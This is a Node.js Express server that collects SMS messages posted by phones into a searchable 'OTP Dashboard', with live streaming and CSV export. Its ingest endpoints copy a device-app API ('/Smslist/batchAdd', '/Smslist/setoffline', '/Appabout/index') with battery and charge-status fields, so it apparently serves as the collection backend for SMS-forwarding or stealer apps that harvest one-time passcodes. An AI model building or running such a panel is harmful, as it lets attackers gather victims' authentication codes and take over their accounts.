'use strict';

const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const PORT = Number(process.env.PORT || 3000);
const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
const DASH_USER = process.env.DASH_USER || 'admin';
const DASH_PASS = process.env.DASH_PASS || '';
const INGEST_TOKEN = process.env.INGEST_TOKEN || '';
const DATABASE_URL = process.env.DATABASE_URL || '';
const PGSSL = String(process.env.PGSSL || '').toLowerCase() === 'true';
const MAX_MESSAGES = Number(process.env.MAX_MESSAGES || 5000);

const app = express();
app.disable('x-powered-by');
app.set('trust proxy', 1);
app.use(express.json({ limit: '2mb' }));
app.use(express.urlencoded({ extended: true, limit: '2mb' }));

/* ------------------------------------------------------------------ storage */

const store = { messages: [], hashes: new Set(), nextId: 1 };
let pool = null;
let saveTimer = null;

function loadFileStore() {
  try {
    const raw = JSON.parse(fs.readFileSync(path.join(DATA_DIR, 'store.json'), 'utf8'));
    if (Array.isArray(raw.messages)) {
      store.messages = raw.messages.slice(0, MAX_MESSAGES);
      store.hashes = new Set(store.messages.map((m) => m.hash));
      store.nextId = store.messages.reduce((n, m) => Math.max(n, m.id || 0), 0) + 1;
    }
  } catch {
    /* first boot */
  }
}

function saveFileStore() {
  if (pool) return;
  clearTimeout(saveTimer);
  saveTimer = setTimeout(() => {
    try {
      fs.mkdirSync(DATA_DIR, { recursive: true });
      fs.writeFileSync(path.join(DATA_DIR, 'store.json'), JSON.stringify({ messages: store.messages }));
    } catch (err) {
      console.error('[store] save failed:', err.message);
    }
  }, 250);
}

async function initStorage() {
  if (!DATABASE_URL) {
    loadFileStore();
    console.log(`[store] file mode, ${store.messages.length} messages loaded`);
    return;
  }
  const { Pool } = require('pg');
  pool = new Pool({
    connectionString: DATABASE_URL,
    ssl: PGSSL ? { rejectUnauthorized: false } : false,
    max: 5,
  });
  await pool.query(`
    CREATE TABLE IF NOT EXISTS messages (
      id BIGSERIAL PRIMARY KEY,
      phone TEXT,
      sender TEXT,
      message TEXT,
      ts BIGINT,
      battery INTEGER,
      status INTEGER,
      version TEXT,
      received_at BIGINT,
      hash TEXT UNIQUE
    )
  `);
  const { rows } = await pool.query('SELECT * FROM messages ORDER BY received_at DESC LIMIT $1', [MAX_MESSAGES]);
  store.messages = rows.map(rowToMessage);
  store.hashes = new Set(store.messages.map((m) => m.hash));
  store.nextId = store.messages.reduce((n, m) => Math.max(n, m.id || 0), 0) + 1;
  console.log(`[store] postgres mode, ${store.messages.length} messages loaded`);
}

function rowToMessage(row) {
  return {
    id: Number(row.id),
    phone: row.phone || '',
    sender: row.sender || '',
    message: row.message || '',
    ts: Number(row.ts) || 0,
    battery: row.battery === null || row.battery === undefined ? null : Number(row.battery),
    status: row.status === null || row.status === undefined ? null : Number(row.status),
    version: row.version || '',
    receivedAt: Number(row.received_at) || 0,
    hash: row.hash,
  };
}

/* --------------------------------------------------------------------- sse */

const clients = new Set();

function broadcast(message) {
  const payload = `event: message\ndata: ${JSON.stringify(message)}\n\n`;
  for (const res of clients) {
    try {
      res.write(payload);
    } catch {
      clients.delete(res);
    }
  }
}

setInterval(() => {
  for (const res of clients) {
    try {
      res.write(': ping\n\n');
    } catch {
      clients.delete(res);
    }
  }
}, 25000).unref();

/* ------------------------------------------------------------------ ingest */

function toNumber(value) {
  if (value === null || value === undefined || value === '') return null;
  const n = Number(value);
  return Number.isFinite(n) ? n : null;
}

function parseTimestamp(value) {
  if (value === null || value === undefined || value === '') return Date.now();
  if (typeof value === 'number' && Number.isFinite(value)) return value;
  const text = String(value).trim();
  if (/^\d{10,}$/.test(text)) return Number(text);
  const parsed = Date.parse(text);
  return Number.isFinite(parsed) ? parsed : Date.now();
}

function normalizeOne(input) {
  if (!input || typeof input !== 'object') return null;
  const message = String(
    input.message ?? input.content ?? input.body ?? input.text ?? input.sms ?? ''
  ).trim();
  if (!message) return null;
  const phone = String(input.phone ?? input.phoneNum ?? input.number ?? input.to ?? '').trim();
  const sender = String(input.sender ?? input.senderPhone ?? input.from ?? input.address ?? '').trim();
  return {
    phone,
    sender,
    message,
    ts: parseTimestamp(input.ts ?? input.createTime ?? input.date ?? input.timestamp),
    battery: toNumber(input.battery ?? input.ele),
    status: toNumber(input.status ?? input.chargeStatus),
    version: String(input.version ?? '').trim(),
  };
}

function parseDiscordContent(content) {
  const out = [];
  const blocks = String(content).split(/\n{2,}/);
  for (const block of blocks) {
    const lines = block.split('\n').map((l) => l.trim()).filter(Boolean);
    if (lines.length < 2) continue;
    const sender = lines[0].replace(/^\*+|\*+$/g, '').trim();
    const body = lines[1];
    const ts = lines[2] || '';
    if (!body) continue;
    out.push({ sender, message: body, ts: parseTimestamp(ts) });
  }
  return out;
}

function extractBatch(body) {
  if (!body || typeof body !== 'object') return [];

  if (typeof body.data === 'string') {
    try {
      const parsed = JSON.parse(body.data);
      if (Array.isArray(parsed)) return parsed;
      if (parsed && typeof parsed === 'object') return [parsed];
    } catch {
      /* fall through */
    }
  }

  if (Array.isArray(body.data)) return body.data;
  if (Array.isArray(body.messages)) return body.messages;
  if (Array.isArray(body)) return body;

  if (typeof body.content === 'string') return parseDiscordContent(body.content);

  if (body.message || body.content || body.body || body.text) return [body];

  return [];
}

function hashMessage(m) {
  return crypto.createHash('sha1').update([m.phone, m.sender, m.ts, m.message].join('|')).digest('hex');
}

async function addMessage(input) {
  const normalized = normalizeOne(input);
  if (!normalized) return null;
  const hash = hashMessage(normalized);
  if (store.hashes.has(hash)) return null;

  const message = {
    ...normalized,
    id: store.nextId++,
    receivedAt: Date.now(),
    hash,
  };

  store.hashes.add(hash);
  store.messages.unshift(message);
  if (store.messages.length > MAX_MESSAGES) {
    const removed = store.messages.pop();
    if (removed) store.hashes.delete(removed.hash);
  }

  saveFileStore();
  broadcast(message);

  if (pool) {
    pool
      .query(
        `INSERT INTO messages (phone, sender, message, ts, battery, status, version, received_at, hash)
         VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9) ON CONFLICT (hash) DO NOTHING`,
        [
          message.phone,
          message.sender,
          message.message,
          message.ts,
          message.battery,
          message.status,
          message.version,
          message.receivedAt,
          message.hash,
        ]
      )
      .catch((err) => console.error('[store] insert failed:', err.message));
  }

  return message;
}

/* -------------------------------------------------------------------- auth */

function safeEqual(a, b) {
  const ba = Buffer.from(String(a));
  const bb = Buffer.from(String(b));
  if (ba.length !== bb.length) return false;
  return crypto.timingSafeEqual(ba, bb);
}

function basicAuth(req, res, next) {
  if (!DASH_PASS) return next();
  const header = req.headers.authorization || '';
  if (header.startsWith('Basic ')) {
    const decoded = Buffer.from(header.slice(6), 'base64').toString('utf8');
    const index = decoded.indexOf(':');
    const user = decoded.slice(0, index);
    const pass = decoded.slice(index + 1);
    if (safeEqual(user, DASH_USER) && safeEqual(pass, DASH_PASS)) return next();
  }
  res.set('WWW-Authenticate', 'Basic realm="OTP Dashboard"');
  return res.status(401).send('Authentication required');
}

function ingestAuth(req, res, next) {
  if (!INGEST_TOKEN) return next();
  const header = req.headers['x-ingest-token'];
  if (header && safeEqual(header, INGEST_TOKEN)) return next();
  if (req.ingestViaPath) return next();
  return res.status(401).json({ ok: false, error: 'invalid ingest token' });
}

/* Token-in-path support: /<INGEST_TOKEN>/api/Smslist/batchAdd */
app.use((req, _res, next) => {
  if (INGEST_TOKEN && req.path.startsWith(`/${INGEST_TOKEN}/`)) {
    req.url = req.url.slice(INGEST_TOKEN.length + 1);
    req.ingestViaPath = true;
  }
  next();
});

/* ------------------------------------------------------------------ routes */

app.get('/healthz', (_req, res) => {
  res.json({ ok: true, uptime: process.uptime(), messages: store.messages.length });
});

app.post(
  ['/api/ingest', '/api/sms', '/api/Smslist/batchAdd', '/Smslist/batchAdd'],
  ingestAuth,
  async (req, res) => {
    const batch = extractBatch(req.body);
    if (!batch.length) return res.status(400).json({ ok: false, error: 'no messages in payload' });

    let accepted = 0;
    for (const item of batch) {
      const saved = await addMessage(item);
      if (saved) accepted += 1;
    }
    res.json({ ok: true, accepted, duplicates: batch.length - accepted, status: 200 });
  }
);

app.post(['/api/Smslist/setoffline', '/Smslist/setoffline'], ingestAuth, (_req, res) => {
  res.json({ ok: true, status: 200 });
});

app.get(['/api/Appabout/index', '/Appabout/index'], ingestAuth, (_req, res) => {
  res.json({ status: 200, data: { data: 'Contact us on the dashboard.' } });
});

app.get('/api/messages', basicAuth, (req, res) => {
  const limit = Math.min(Math.max(Number(req.query.limit) || 200, 1), 2000);
  const phone = String(req.query.phone || '').trim();
  const query = String(req.query.q || '').trim().toLowerCase();

  let rows = store.messages;
  if (phone) rows = rows.filter((m) => m.phone === phone);
  if (query) {
    rows = rows.filter((m) =>
      [m.phone, m.sender, m.message, m.version].join(' ').toLowerCase().includes(query)
    );
  }
  res.json({ ok: true, count: rows.length, messages: rows.slice(0, limit) });
});

app.get('/api/stats', basicAuth, (_req, res) => {
  const now = Date.now();
  const startOfDay = new Date();
  startOfDay.setHours(0, 0, 0, 0);
  const today = store.messages.filter((m) => m.receivedAt >= startOfDay.getTime()).length;
  const phones = new Set(store.messages.map((m) => m.phone).filter(Boolean));
  const last = store.messages[0];
  res.json({
    ok: true,
    total: store.messages.length,
    today,
    phones: phones.size,
    lastAt: last ? last.receivedAt : null,
    now,
  });
});

app.get('/api/stream', basicAuth, (req, res) => {
  res.set({
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache, no-transform',
    Connection: 'keep-alive',
    'X-Accel-Buffering': 'no',
  });
  res.flushHeaders();
  res.write(`event: hello\ndata: ${JSON.stringify({ ok: true })}\n\n`);
  clients.add(res);
  req.on('close', () => clients.delete(res));
});

app.get('/api/export.csv', basicAuth, (_req, res) => {
  const escape = (value) => `"${String(value ?? '').replace(/"/g, '""')}"`;
  const header = 'received_at,phone,sender,message,device_ts,battery,status,version\n';
  const rows = store.messages
    .map((m) =>
      [
        escape(new Date(m.receivedAt).toISOString()),
        escape(m.phone),
        escape(m.sender),
        escape(m.message),
        escape(m.ts),
        escape(m.battery),
        escape(m.status),
        escape(m.version),
      ].join(',')
    )
    .join('\n');
  res.set('Content-Type', 'text/csv; charset=utf-8');
  res.set('Content-Disposition', 'attachment; filename="messages.csv"');
  res.send(header + rows);
});

app.use(basicAuth, express.static(path.join(__dirname, 'public'), { extensions: ['html'] }));

app.use((_req, res) => res.status(404).json({ ok: false, error: 'not found' }));

app.use((err, _req, res, _next) => {
  console.error('[error]', err.message);
  res.status(500).json({ ok: false, error: 'internal error' });
});

/* ------------------------------------------------------------------- start */

initStorage()
  .then(() => {
    app.listen(PORT, () => {
      console.log(`[server] listening on :${PORT}`);
      console.log(`[server] dashboard ${DASH_PASS ? 'protected' : 'OPEN (set DASH_PASS)'}`);
      console.log(`[server] ingest ${INGEST_TOKEN ? 'token required' : 'OPEN (set INGEST_TOKEN)'}`);
    });
  })
  .catch((err) => {
    console.error('[boot] storage init failed:', err);
    process.exit(1);
  });
